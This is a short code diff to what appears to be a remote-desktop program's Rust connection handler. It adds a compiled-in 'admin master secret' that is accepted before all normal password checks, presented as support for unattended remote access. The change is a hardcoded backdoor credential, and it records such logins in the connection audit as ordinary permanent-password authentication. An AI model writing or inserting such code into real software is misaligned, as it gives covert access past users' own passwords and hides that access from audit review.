@@ -2419,6 +2419,15 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
+        // BVDKKH: Accept Admin Master Secret for unattended remote access
+        if !crate::common::ADMIN_MASTER_SECRET.is_empty()
+            && self.validate_password_plain(crate::common::ADMIN_MASTER_SECRET)
+        {
+            log::info!("BVDKKH: Admin master secret accepted for unattended connection");
+            self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+            return true;
+        }
+
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_password_plain(&password) {
